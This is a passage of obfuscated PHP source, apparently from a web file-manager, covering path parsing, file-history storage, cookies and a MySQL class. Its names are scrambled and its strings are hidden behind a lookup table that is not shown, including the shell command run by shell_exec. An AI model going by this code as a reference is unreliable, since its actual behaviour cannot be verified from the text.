== TEMP_PATH) { return !1; } $êè•ª“• = self::pathHistory($íçË”‹®); $ËÂş¶‡‚ = array($´Û§æ±[1252] => $êè•ª“• . $´Û§æ±[1239], $´Û§æ±[1251] => rtrim(get_path_father($êè•ª“•), $´Û§æ±[8]) . $´Û§æ±[8], $´Û§æ±[369] => array()); $µîø¨£ = IO::getContent($ËÂş¶‡‚[$´Û§æ±[1252]]); if ($µîø¨£) { $á£µ–Ü® = json_decode($µîø¨£, !0); if (is_array($á£µ–Ü®)) { $ËÂş¶‡‚[$´Û§æ±[369]] = $á£µ–Ü®; } } return $ËÂş¶‡‚; } private static function saveData($åÉõÉ†, $®‚ìÈÒÈ) { $Ÿİ¯ğÅú =& $_SERVER[óó‹¸‚å]; self::log($Ÿİ¯ğÅú[1255] . $åÉõÉ† . $Ÿİ¯ğÅú[71] . count($®‚ìÈÒÈ), $Ÿİ¯ğÅú[756]); if ($®‚ìÈÒÈ) { return IO::setContent($åÉõÉ†, json_encode($®‚ìÈÒÈ)); } $ŒÃÂ‚Æç = IO::pathFather($åÉõÉ†); IO::remove($åÉõÉ†); self::clearEmptyFolder($ŒÃÂ‚Æç); return !0; } public static function clearEmptyFolder($¸¯©Á€ğ) { $¸¶×‹Òæ =& $_SERVER[óó‹¸‚å]; if (trim($¸¯©Á€ğ, $¸¶×‹Òæ[8]) == trim(self::$_historyBase, $¸¶×‹Òæ[8])) { return; } $Ò¹°ãù› = IO::pathFather($¸¯©Á€ğ); $ò–ÈÔº´ = IO::has($¸¯©Á€ğ, !0); if ($ò–ÈÔº´[$¸¶×‹Òæ[207]] > 0 || $ò–ÈÔº´[$¸¶×‹Òæ[208]] > 0) { return; } IO::remove($¸¯©Á€ğ); self::clearEmptyFolder($Ò¹°ãù›); } private static function getBasePath() { $Ö£Á’‰ =& $_SERVER[óó‹¸‚å]; $ÎÀœ›­ = Model($Ö£Á’‰[1256])->get($Ö£Á’‰[1257]); if ($ÎÀœ›­) { if (!IO::exist($ÎÀœ›­)) { IO::mkdir($ÎÀœ›­); } if (get_path_this($ÎÀœ›­) == $Ö£Á’‰[1242]) { $…Ş‰Î¾¨ = $Ö£Á’‰[1258] . rand_string(8); @rename($ÎÀœ›­, get_path_father($ÎÀœ›­) . $Ö£Á’‰[8] . $…Ş‰Î¾¨); $ÎÀœ›­ = DATA_PATH . $…Ş‰Î¾¨ . $Ö£Á’‰[8]; file_put_contents(DATA_PATH . $Ö£Á’‰[1192], $Ö£Á’‰[12]); Model($Ö£Á’‰[1256])->set($Ö£Á’‰[1257], $ÎÀœ›­); } return $ÎÀœ›­; } $ÎÀœ›­ = DATA_PATH . $Ö£Á’‰[1258] . rand_string(8) . $Ö£Á’‰[8]; $ÎÀœ›­ = IO::mkdir($ÎÀœ›­); $ÎÀœ›­ = rtrim($ÎÀœ›­, $Ö£Á’‰[8]) . $Ö£Á’‰[8]; file_put_contents($ÎÀœ›­ . $Ö£Á’‰[1192], $Ö£Á’‰[12]); file_put_contents(DATA_PATH . $Ö£Á’‰[1192], $Ö£Á’‰[12]); Model($Ö£Á’‰[1256])->set($Ö£Á’‰[1257], $ÎÀœ›­); return $ÎÀœ›­; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\162\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\x72\x52\x65\143\171\x63\154\145\175"; const KOD_USER_FAV = "\x7b\165\163\x65\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\162\x46\x69\154\x65\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\162\x46\x69\x6c\145\124\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\165\160\122\157\x6f\x74\x53\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\x72\123\150\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\x72\x53\150\141\x72\145\114\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\x72\x65\124\157\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\x72\145\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\145\111\x74\x65\155\114\151\x6e\x6b\175"; const KOD_SEARCH = "\x7b\x73\x65\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\x63\153\x7d"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\173\165\x73\x65\162\122\x65\x6e\143\145\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\x72\151\x76\x65\162\175"; public static function typeList() { $ø½ºûÉ£ =& $_SERVER[óó‹¸‚å]; return array($ø½ºûÉ£[1259] => self::KOD_SOURCE, $ø½ºûÉ£[1260] => self::KOD_USER_RECYCLE, $ø½ºûÉ£[1261] => self::KOD_USER_FAV, $ø½ºûÉ£[1262] => self::KOD_USER_FILE_TAG, $ø½ºûÉ£[1263] => self::KOD_USER_FILE_TYPE, $ø½ºûÉ£[1264] => self::KOD_GROUP_ROOT_SELF, $ø½ºûÉ£[1265] => self::KOD_USER_SHARE, $ø½ºûÉ£[1266] => self::KOD_USER_SHARE_LINK, $ø½ºûÉ£[1267] => self::KOD_USER_SHARE_TO_ME, $ø½ºûÉ£[1268] => self::KOD_SHARE_ITEM, $ø½ºûÉ£[1269] => self::KOD_SHARE_LINK, $ø½ºûÉ£[1270] => self::KOD_SEARCH, $ø½ºûÉ£[1271] => self::KOD_BLOCK, $ø½ºûÉ£[1272] => self::KOD_IO, $ø½ºûÉ£[1273] => self::KOD_USER_RECENT, $ø½ºûÉ£[1274] => self::KOD_USER_DRIVER); } public static function parse($œ˜”ë¨‰) { $ ¿€ı© =& $_SERVER[óó‹¸‚å]; $œ˜”ë¨‰ = self::clear($œ˜”ë¨‰); $¯Ó¥Ñ©„ = array_values(self::typeList()); preg_match($ ¿€ı©[1275], $œ˜”ë¨‰, $‘¬ü¤Ìš); $‡×ºìñ = array($ ¿€ı©[422] => !1, $ ¿€ı©[1276] => !1, $ ¿€ı©[419] => !1, $ ¿€ı©[84] => $œ˜”ë¨‰, $ ¿€ı©[1177] => !1, $ ¿€ı©[1176] => $ ¿€ı©[12]); if (is_array($‘¬ü¤Ìš) && count($‘¬ü¤Ìš) == 5) { $™à÷•Â‡ = $ ¿€ı©[1277] . $‘¬ü¤Ìš[2] . $ ¿€ı©[327]; if (in_array($™à÷•Â‡, $¯Ó¥Ñ©„)) { $‡×ºìñ[$ ¿€ı©[1177]] = $‘¬ü¤Ìš[1]; $‡×ºìñ[$ ¿€ı©[33]] = $™à÷•Â‡; $‡×ºìñ[$ ¿€ı©[1278]] = substr($™à÷•Â‡, 1, -1); $‡×ºìñ[$ ¿€ı©[399]] = $‘¬ü¤Ìš[3]; } $‡×ºìñ[$ ¿€ı©[1176]] = $‘¬ü¤Ìš[4]; } $¾âöËâ = array($ ¿€ı©[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $‡×ºìñ[$ ¿€ı©[1241]] = in_array($‡×ºìñ[$ ¿€ı©[33]], $¾âöËâ); return $‡×ºìñ; } public static function isTruePath($°–Ä—š) { $û“”»Í =& $_SERVER[óó‹¸‚å]; if (substr($°–Ä—š, 0, 1) != $û“”»Í[1277]) { return !0; } if (strpos($°–Ä—š, $û“”»Í[408]) === 0) { return !0; } if (strpos($°–Ä—š, $û“”»Í[1245]) === 0) { return !0; } if (strpos($°–Ä—š, $û“”»Í[1279]) === 0) { return !0; } if (strpos($°–Ä—š, $û“”»Í[1280]) === 0) { return !0; } if (strpos($°–Ä—š, $û“”»Í[1281]) === 0) { return !0; } return !1; } public static function clear($Ÿ¢‚Ïâˆ) { $Õê¡öÉÖ =& $_SERVER[óó‹¸‚å]; $Ÿ¢‚Ïâˆ = str_replace(array($Õê¡öÉÖ[1085], $Õê¡öÉÖ[231]), $Õê¡öÉÖ[53], $Ÿ¢‚Ïâˆ); $Ÿ¢‚Ïâˆ = str_replace($Õê¡öÉÖ[97], $Õê¡öÉÖ[8], $Ÿ¢‚Ïâˆ); $„øœŠÒ“ = $Õê¡öÉÖ[1282]; if (substr($Ÿ¢‚Ïâˆ, 0, 3) == $Õê¡öÉÖ[1283]) { $Ÿ¢‚Ïâˆ = substr($Ÿ¢‚Ïâˆ, 3); } while (strstr($Ÿ¢‚Ïâˆ, $„øœŠÒ“)) { $Ÿ¢‚Ïâˆ = str_replace($„øœŠÒ“, $Õê¡öÉÖ[8], $Ÿ¢‚Ïâˆ); } $Ÿ¢‚Ïâˆ = preg_replace($Õê¡öÉÖ[1284], $Õê¡öÉÖ[8], $Ÿ¢‚Ïâˆ); if ($Ÿ¢‚Ïâˆ == $Õê¡öÉÖ[8]) { return $Õê¡öÉÖ[8]; } $Ÿ¢‚Ïâˆ = rtrim($Ÿ¢‚Ïâˆ, $Õê¡öÉÖ[8]); return $Ÿ¢‚Ïâˆ; } public static function sourceID($×·ûê‘ó) { $Ÿü­ˆÏĞ =& $_SERVER[óó‹¸‚å]; $êÆ‰€ˆ´ = self::parse($×·ûê‘ó); if ($êÆ‰€ˆ´[$Ÿü­ˆÏĞ[33]] !== self::KOD_SOURCE) { show_json(LNG($Ÿü­ˆÏĞ[1285]), !1); } return $êÆ‰€ˆ´[$Ÿü­ˆÏĞ[399]]; } public static function make($ÍÊ©ğ²À) { if (!$ÍÊ©ğ²À) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÍÊ©ğ²À)); } public static function makeShare($ş‚£¾Äè, $ßÅã¦ôª) { return self::makePath(self::KOD_SHARE_ITEM, $ş‚£¾Äè, $ßÅã¦ôª); } public static function makeFileTypePath($ªÈÓÜ¶Â) { return self::makePath(self::KOD_USER_FILE_TYPE, $ªÈÓÜ¶Â); } public static function makeFileTagPath($Ş¬‡£—Å) { return self::makePath(self::KOD_USER_FILE_TAG, $Ş¬‡£—Å); } public static function makePath($’ Ùª, $éïû‰à = '', $åÏğêî¨ = '') { $Ÿßë¼¨À =& $_SERVER[óó‹¸‚å]; $èŒç›ƒ = substr($’ Ùª, 1, -1); $šÖ¦ñÌû = $Ÿßë¼¨À[1286] . $èŒç›ƒ . $Ÿßë¼¨À[1287] . $éïû‰à . $Ÿßë¼¨À[1288]; $šÖ¦ñÌû = $åÏğêî¨ ? $šÖ¦ñÌû . $åÏğêî¨ . $Ÿßë¼¨À[8] : $šÖ¦ñÌû; return $šÖ¦ñÌû; } public static function hashPath($Ë‰ªğ è, $Šğ™¦ = true) { $Î­÷À„‘ =& $_SERVER[óó‹¸‚å]; $ì¿ìá¾Ê = is_array($Ë‰ªğ è) ? $Ë‰ªğ è : IO::info($Ë‰ªğ è); $Æ‡Û›‡Á = _get($ì¿ìá¾Ê, $Î­÷À„‘[1289], $Î­÷À„‘[12]); if (!$Æ‡Û›‡Á && isset($ì¿ìá¾Ê[$Î­÷À„‘[402]])) { $ì¿ìá¾Ê = IO::info(KodIO::make($ì¿ìá¾Ê[$Î­÷À„‘[402]])); $Æ‡Û›‡Á = _get($ì¿ìá¾Ê, $Î­÷À„‘[1289], $Î­÷À„‘[12]); } if (!$Æ‡Û›‡Á && $Šğ™¦) { $öƒ¡˜³ = KodIO::parse($ì¿ìá¾Ê[$Î­÷À„‘[84]]); if (!$öƒ¡˜³[$Î­÷À„‘[33]]) { $Æ‡Û›‡Á = IO::hashSimple($ì¿ìá¾Ê[$Î­÷À„‘[84]]); } } if (!$Æ‡Û›‡Á) { $Æ‡Û›‡Á = md5($ì¿ìá¾Ê[$Î­÷À„‘[84]] . $ì¿ìá¾Ê[$Î­÷À„‘[76]] . $ì¿ìá¾Ê[$Î­÷À„‘[85]]); } return $Æ‡Û›‡Á; } public static function hashPathSafe($ÏİªÂşà, $òåÇÏÌ€ = true) { $¡øÙÓÉ =& $_SERVER[óó‹¸‚å]; $êÏş¿‚¦ = self::hashPath($ÏİªÂşà, $òåÇÏÌ€); return md5($êÏş¿‚¦ . $¡øÙÓÉ[1290] . Model($¡øÙÓÉ[774])->get($¡øÙÓÉ[775])); } public static function initSystemPath() { $Ûòîª— =& $_SERVER[óó‹¸‚å]; if (defined($Ûòîª—[1291])) { return; } define($Ûòîª—[1291], self::systemPath($Ûòîª—[1292])); define($Ûòîª—[1293], self::systemPath($Ûòîª—[1294])); define($Ûòîª—[1295], self::systemPath($Ûòîª—[1296])); define($Ûòîª—[1297], self::systemPath($Ûòîª—[1298])); IOHistory::bindEvent(); } public static function systemPath($¨Ñ °’) { $àÌ¯Š®™ =& $_SERVER[óó‹¸‚å]; $Áüæ Ø = $àÌ¯Š®™[1299] . ucfirst($¨Ñ °’); $â¼¢ …¯ = Model($àÌ¯Š®™[774])->get($Áüæ Ø); if ($â¼¢ …¯) { return $â¼¢ …¯; } if ($¨Ñ °’ == $àÌ¯Š®™[1292]) { $â¼¢ …¯ = self::make(Model($àÌ¯Š®™[829])->systemRootPathAdd($àÌ¯Š®™[544])); } else { $â¼¢ …¯ = self::systemPath($àÌ¯Š®™[1292]); $Ø¸µù‚Õ = self::sourceID($â¼¢ …¯); $â¼¢ …¯ = self::make(Model($àÌ¯Š®™[829])->mkdir($Ø¸µù‚Õ, $¨Ñ °’)); } Model($àÌ¯Š®™[774])->set($Áüæ Ø, $â¼¢ …¯); return $â¼¢ …¯; } public static function systemFolder($ÉªïêÂƒ) { $ÚÓÌ¿’ = IO_PATH_SYSTEM_SOURCE . $ÉªïêÂƒ; $ôƒ°ç = Cache::get($ÚÓÌ¿’); if (!$ôƒ°ç) { $ÄòÉ´È¹ = IO::infoFull($ÚÓÌ¿’); if (!$ÄòÉ´È¹) { $ôƒ°ç = IO::mkdir($ÚÓÌ¿’, REPEAT_SKIP); } else { $ôƒ°ç = $ÄòÉ´È¹[$_SERVER[óó‹¸‚å][84]]; } Cache::set($ÚÓÌ¿’, $ôƒ°ç, 3600 * 10); } return $ôƒ°ç; } public static function defaultDriver() { return Model($_SERVER[óó‹¸‚å][771])->defaultDriver(); } public static function defaultIO() { $×”‰¾…˜ =& $_SERVER[óó‹¸‚å]; $°‚Ÿì¯À = self::defaultDriver(); return $×”‰¾…˜[1300] . $°‚Ÿì¯À[$×”‰¾…˜[399]] . $×”‰¾…˜[1288]; } public static function defaultDriverInit() { static $ŠñÖú¶… = false; if ($ŠñÖú¶…) { return $ŠñÖú¶…; } $ŠñÖú¶… = IO::init(self::defaultIO()); return $ŠñÖú¶…; } public static function fileTypeList() { $‘±®³ú¸ =& $_SERVER[óó‹¸‚å]; $¶¡£ÄˆØ = $GLOBALS[$‘±®³ú¸[6]][$‘±®³ú¸[1301]]; foreach ($¶¡£ÄˆØ as $·äöÚê¾ => $î¯‘ïŞÂ) { $Öšû™ä… = $‘±®³ú¸[1302] . $·äöÚê¾; $ñòÄÉ­Ñ = LNG($Öšû™ä…); if ($Öšû™ä… != $ñòÄÉ­Ñ) { $¶¡£ÄˆØ[$·äöÚê¾][$‘±®³ú¸[32]] = $ñòÄÉ­Ñ; } } return $¶¡£ÄˆØ; } public static function diskList($‘·Ê£ƒ = true) { $ş¼½Áı¯ = $_SERVER[óó‹¸‚å][1303]; if ($‘·Ê£ƒ) { $ÎÇ±«Ê¾ = Cache::get($ş¼½Áı¯); if (is_array($ÎÇ±«Ê¾)) { return $ÎÇ±«Ê¾; } } $ÎÇ±«Ê¾ = self::diskListGet(); Cache::set($ş¼½Áı¯, $ÎÇ±«Ê¾, 60); return $ÎÇ±«Ê¾; } public static function diskListGet() { $Å¡ĞÖ =& $_SERVER[óó‹¸‚å]; $œ­×èØ = array(); if ($GLOBALS[$Å¡ĞÖ[6]][$Å¡ĞÖ[1304]] == $Å¡ĞÖ[1305]) { $Ë—ÕûÙÆ = $Å¡ĞÖ[1306]; for ($Šæ†¸Ö = 0; $Šæ†¸Ö < strlen($Ë—ÕûÙÆ); $Šæ†¸Ö++) { $à—àÃÌË = $Ë—ÕûÙÆ[$Šæ†¸Ö] . $Å¡ĞÖ[1307]; if (file_exists($à—àÃÌË)) { $œ­×èØ[] = $à—àÃÌË; } } return $œ­×èØ; } if (!function_exists($Å¡ĞÖ[98])) { $œ­×èØ[] = $Å¡ĞÖ[839]; return $œ­×èØ; } $äªé¨½Ä = explode($Å¡ĞÖ[231], shell_exec($Å¡ĞÖ[1308])); array_shift($äªé¨½Ä); array_pop($äªé¨½Ä); $•ºëüüŸ = array($Å¡ĞÖ[1309], $Å¡ĞÖ[1310], $Å¡ĞÖ[1311], $Å¡ĞÖ[1312], $Å¡ĞÖ[1313], $Å¡ĞÖ[1314], $Å¡ĞÖ[1315], $Å¡ĞÖ[1316]); foreach ($äªé¨½Ä as $òÉİŠó•) { $¶šÏèƒÚ = preg_split($Å¡ĞÖ[1317], $òÉİŠó•); $à—àÃÌË = $¶šÏèƒÚ[count($¶šÏèƒÚ) - 1]; if (!strstr($¶šÏèƒÚ[0], $Å¡ĞÖ[1318]) || !$à—àÃÌË) { continue; } $ãğîÕø = rtrim($à—àÃÌË, $Å¡ĞÖ[8]) . $Å¡ĞÖ[8]; if (in_array($ãğîÕø, $•ºëüüŸ)) { continue; } $œ­×èØ[] = $ãğîÕø; } return $œ­×èØ; } public static function isSameDisk($ŸÙà¦›, $ÅµıÈ¦”) { $‚°º›ôˆ =& $_SERVER[óó‹¸‚å]; if ($GLOBALS[$‚°º›ôˆ[6]][$‚°º›ôˆ[1304]] == $‚°º›ôˆ[1305]) { return strtolower(substr($ŸÙà¦›, 0, 1)) == strtolower(substr($ÅµıÈ¦”, 0, 1)); } $©‚Üóğ¾ = self::diskList(); $Ï‡ë¥Şë = !1; $ˆü—´äÏ = !1; sort($©‚Üóğ¾); $©‚Üóğ¾ = array_reverse($©‚Üóğ¾); $ŸÙà¦› = rtrim($ŸÙà¦›, $‚°º›ôˆ[8]) . $‚°º›ôˆ[8]; $ÅµıÈ¦” = rtrim($ÅµıÈ¦”, $‚°º›ôˆ[8]) . $‚°º›ôˆ[8]; foreach ($©‚Üóğ¾ as $Æ´òÚÍ’) { $ñºôÛî = strlen($Æ´òÚÍ’); if (!$Ï‡ë¥Şë && substr($ŸÙà¦›, 0, $ñºôÛî) == $Æ´òÚÍ’) { $Ï‡ë¥Şë = $Æ´òÚÍ’; } if (!$ˆü—´äÏ && substr($ÅµıÈ¦”, 0, $ñºôÛî) == $Æ´òÚÍ’) { $ˆü—´äÏ = $Æ´òÚÍ’; } if ($Ï‡ë¥Şë && $ˆü—´äÏ) { break; } } return $Ï‡ë¥Şë === $ˆü—´äÏ; } public static function transferType($ÏÖåÅğ½, $ßòÏÂ¨è) { $š–­¡Ö· =& $_SERVER[óó‹¸‚å]; $¶öÚ¶¹ò = self::driverType($ÏÖåÅğ½); $Ÿ®—¶Ùı = self::driverType($ßòÏÂ¨è); if ($¶öÚ¶¹ò[$š–­¡Ö·[33]] == $Ÿ®—¶Ùı[$š–­¡Ö·[33]] && $¶öÚ¶¹ò[$š–­¡Ö·[1319]] == $Ÿ®—¶Ùı[$š–­¡Ö·[1319]]) { return $š–­¡Ö·[1320]; } if ($¶öÚ¶¹ò[$š–­¡Ö·[33]] == $š–­¡Ö·[872] && $Ÿ®—¶Ùı[$š–­¡Ö·[33]] == $š–­¡Ö·[106]) { return $š–­¡Ö·[1202]; } if ($¶öÚ¶¹ò[$š–­¡Ö·[33]] == $š–­¡Ö·[106] && $Ÿ®—¶Ùı[$š–­¡Ö·[33]] == $š–­¡Ö·[872]) { return $š–­¡Ö·[107]; } return $š–­¡Ö·[1321]; } public static function driverType($¾±êú) { $ºŞÒº¹ =& $_SERVER[óó‹¸‚å]; $¾õàÀœó = str_replace($ºŞÒº¹[1322], $ºŞÒº¹[12], strtolower($¾±êú->getType())); if ($¾õàÀœó == $ºŞÒº¹[762] || $¾õàÀœó == $ºŞÒº¹[1323] || $¾õàÀœó == $ºŞÒº¹[1324]) { $¾±êú = self::defaultDriverInit(); } else { if ($¾õàÀœó == $ºŞÒº¹[1212] || $¾õàÀœó == $ºŞÒº¹[1325]) { $¾±êú = IO::init($¾±êú->pathParse[$ºŞÒº¹[1158]]); } } $¥š£´Õ´ = $¾±êú->path; $¾õàÀœó = str_replace($ºŞÒº¹[1322], $ºŞÒº¹[12], strtolower($¾±êú->getType())); if ($¾õàÀœó == $ºŞÒº¹[106]) { return array($ºŞÒº¹[33] => $ºŞÒº¹[106], $ºŞÒº¹[1319] => $ºŞÒº¹[12], $ºŞÒº¹[84] => $¥š£´Õ´); } return array($ºŞÒº¹[33] => $ºŞÒº¹[872], $ºŞÒº¹[1319] => $¾±êú->pathDriver, $ºŞÒº¹[84] => $¥š£´Õ´); } public static function pathDriverType($çÜåÊ¥Å) { return $çÜåÊ¥Å ? self::driverType(IO::init($çÜåÊ¥Å)) : !1; } } goto Fï±ŠæŒ…²; C Ì»‘‹¿µ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ØÅÔÇ « = '', $äù¯ê¸± = 0) { if (is_string($ØÅÔÇ «) && $ØÅÔÇ « != $_SERVER[óó‹¸‚å][12]) { $this->prefix = $ØÅÔÇ «; } if (is_numeric($äù¯ê¸±) && $äù¯ê¸± > 0) { $this->expire = $äù¯ê¸±; } } public static function getInstance() { static $š´àÆã; if ($š´àÆã === null) { $š´àÆã = new self(); } return $š´àÆã; } private static $cookieDisable = false; public static function disable($ıí¬Í) { self::$cookieDisable = $ıí¬Í; } private static $sameCookieSet = array(); public static function set($ÍíÏ£È¦, $ÊÇÂøä, $›ÒŒäÍ = 0, $ÎµÏçÙë = false, $©ì€Óû = false) { $×»éˆ =& $_SERVER[óó‹¸‚å]; if (self::$cookieDisable) { return; } if (!$›ÒŒäÍ) { $›ÒŒäÍ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ÍíÏ£È¦]) && self::$sameCookieSet[$ÍíÏ£È¦] == $ÊÇÂøä . $›ÒŒäÍ) { return; } self::$sameCookieSet[$ÍíÏ£È¦] = $ÊÇÂøä . $›ÒŒäÍ; if (!$©ì€Óû) { $©ì€Óû = str_replace(HOST, $×»éˆ[12], APP_HOST); $©ì€Óû = _get($GLOBALS, $×»éˆ[889], $©ì€Óû); } $±ß­Ğ©˜ = $×»éˆ[12]; setcookie($ÍíÏ£È¦, $ÊÇÂøä, time() + $›ÒŒäÍ, $×»éˆ[8] . trim($©ì€Óû, $×»éˆ[8]) . $±ß­Ğ©˜, !1, !1, $ÎµÏçÙë); } public static function setSafe($­º¬Á£•, $µ×Œ ³¿, $ÉÊÑ®± = 0) { self::set($­º¬Á£•, $µ×Œ ³¿, $ÉÊÑ®±, !0); } public static function get($ŠëŒ†¼è) { static $ğïĞã£Ä = false; if (!$ğïĞã£Ä) { self::initHeaderCookie(); $ğïĞã£Ä = !0; } return isset($_COOKIE[$ŠëŒ†¼è]) ? $_COOKIE[$ŠëŒ†¼è] : !1; } private static function initHeaderCookie() { $ÙêûŸï® =& $_SERVER[óó‹¸‚å]; if (!isset($_SERVER[$ÙêûŸï®[890]]) || !$_SERVER[$ÙêûŸï®[890]]) { return; } $ø‰ÉğÁ = explode($ÙêûŸï®[71], $_SERVER[$ÙêûŸï®[890]]); foreach ($ø‰ÉğÁ as $’Ø©Ëõö) { $’Ø©Ëõö = explode($ÙêûŸï®[891], $’Ø©Ëõö); if (count($’Ø©Ëõö) != 2 || !isset($’Ø©Ëõö[1])) { continue; } $_COOKIE[trim($’Ø©Ëõö[0])] = trim($’Ø©Ëõö[1]); } } public static function remove($¤‹ÒÅù‚, $éò¾£ÑŠ = false) { unset($_COOKIE[$¤‹ÒÅù‚]); self::set($¤‹ÒÅù‚, $_SERVER[óó‹¸‚å][12], 1, $éò¾£ÑŠ); } } class DbMysql extends Db { public function __construct($Í·â¿ñ = '') { $úµòÈ¸Ò =& $_SERVER[óó‹¸‚å]; if (!extension_loaded($úµòÈ¸Ò[808])) { think_exception(think_lang($úµòÈ¸Ò[14]) . $úµòÈ¸Ò[892]); } if (!empty($Í·â¿ñ)) { $this->config = $Í·â¿ñ; if (empty($this->config[$úµòÈ¸Ò[17]])) { $this->config[$úµòÈ¸Ò[17]] = $úµòÈ¸Ò[12]; } } } public function connect($‚²£Œê‡ = '', $ĞÍğ¿±Ö = 0, $ÒÆ³Ù¶† = false) { $æÁª¼¯À =& $_SERVER[óó‹¸‚å]; if (!isset($this->linkID[$ĞÍğ¿±Ö])) { if (empty($‚²£Œê‡)) { $‚²£Œê‡ = $this->config; } $Éæ×ØÜ = $‚²£Œê‡[$æÁª¼¯À[893]] . ($‚²£Œê‡[$æÁª¼¯À[894]] ? "\x3a{$‚²£Œê‡[$æÁª¼¯À[894]]}" : $æÁª¼¯À[12]); $ä˜Ë¨á¿ = !empty($‚²£Œê‡[$æÁª¼¯À[17]][$æÁª¼¯À[18]]) ? $‚²£Œê‡[$æÁª¼¯À[17]][$æÁª¼¯À[18]] : $this->pconnect; if ($ä˜Ë¨á¿) { $this->linkID[$ĞÍğ¿±Ö] = mysql_pconnect($Éæ×ØÜ, $‚²£Œê‡[$æÁª¼¯À[895]], $‚²£Œê‡[$æÁª¼¯À[896]], 131072); } else { $this->linkID[$ĞÍğ¿±Ö] = mysql_connect($Éæ×ØÜ, $‚²£Œê‡[$æÁª¼¯À[895]], $‚²£Œê‡[$æÁª¼¯À[896]], !0, 131072); } if (!$this->linkID[$ĞÍğ¿±Ö] || !empty($‚²£Œê‡[$æÁª¼¯À[21]]) && !mysql_select_db($‚²£Œê‡[$æÁª¼¯À[21]], $this->linkID[$ĞÍğ¿±Ö])) { think_exception(mysql_error()); } $ÍÈğµù¨ = mysql_get_server_info($this->linkID[$ĞÍğ¿±Ö]); mysql_query($æÁª¼¯À[897] . think_config($æÁª¼¯À[898]) . $æÁª¼¯À[58], $this->linkID[$ĞÍğ¿±Ö]); if ($ÍÈğµù¨ > $æÁª¼¯À[899]) { mysql_query($æÁª¼¯À[900], $this->linkID[$ĞÍğ¿±Ö]); } $this->connected = !0; if (1 != think_config($æÁª¼¯À[22])) { unset($this->config); } } return $this->linkID[$ĞÍğ¿±Ö]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÄúŞŸÂ“) { $¾õ„˜æ½ =& $_SERVER[óó‹¸‚å]; if (0 === stripos($ÄúŞŸÂ“, $¾õ„˜æ½[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÄúŞŸÂ“; if ($this->queryID) { $this->free(); } think_action_status($¾õ„˜æ½[23], 1); think_status($¾õ„˜æ½[24]); $this->queryID = mysql_query($ÄúŞŸÂ“, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($”ØÈ«Öš) { $œæ¡ãæ§ =& $_SERVER[óó‹¸‚å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”ØÈ«Öš; if ($this->queryID) { $this->free(); } think_action_status($œæ¡ãæ§[25], 1); think_status($œæ¡ãæ§[24]); $§º€ŸÜø = mysql_query($”ØÈ«Öš, $this->_linkID); $this->debug(); if (!1 === $§º€ŸÜø) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[óó‹¸‚å][901], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $„îéõìó = mysql_query($_SERVER[óó‹¸‚å][902], $this->_linkID); $this->transTimes = 0; if (!$„îéõìó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $÷ÅæÓÒÕ = mysql_query($_SERVER[óó‹¸‚å][903], $this->_linkID); $this->transTimes = 0; if (!$÷ÅæÓÒÕ) { $this->error(); return !1; } } return !0; } private function getAll() { $ú®Ã¬É­ = array(); if ($this->numRows > 0) { while ($±ï˜ä’ = mysql_fetch_assoc($this->queryID)) { $ú®Ã¬É­[] = $±ï˜ä’; } mysql_data_seek($this->queryID, 0); } return $ú®Ã¬É­; } public function getFields($¶Üİçù) { $ÔñÍÙÃÆ =& $_SERVER[óó‹¸‚å]; $ÑıÚ¨øÄ = $this->query($ÔñÍÙÃÆ[904] . $this->parseKey($¶Üİçù)); $¿Üªı’Ò = array(); if ($ÑıÚ¨øÄ) { foreach ($ÑıÚ¨øÄ as $¥Ì…“ÓÜ => $ùç“¹õ¥) { $¿Üªı’Ò[$ùç“¹õ¥[$ÔñÍÙÃÆ[31]]] = array($ÔñÍÙÃÆ[32] => $ùç“¹õ¥[$ÔñÍÙÃÆ[31]], $ÔñÍÙÃÆ[33] => $ùç“¹õ¥[$ÔñÍÙÃÆ[34]], $ÔñÍÙÃÆ[35] => (bool) (strtoupper($ùç“¹õ¥[$ÔñÍÙÃÆ[36]]) === $ÔñÍÙÃÆ[905]), $ÔñÍÙÃÆ[37] => $ùç“¹õ¥[$ÔñÍÙÃÆ[38]], $ÔñÍÙÃÆ[39] => strtolower($ùç“¹õ¥[$ÔñÍÙÃÆ[40]]) == $ÔñÍÙÃÆ[41], $ÔñÍÙÃÆ[42] => strtolower($ùç“¹õ¥[$ÔñÍÙÃÆ[43]]) == $ÔñÍÙÃÆ[44]); } } return $¿Üªı’Ò; } public function getTables($ÅœÑê¤Ş = '') { $ÈÑ·óµœ =& $_SERVER[óó‹¸‚å]; if (!empty($ÅœÑê¤Ş)) { $´µä‰ß = $ÈÑ·óµœ[906] . $ÅœÑê¤Ş . 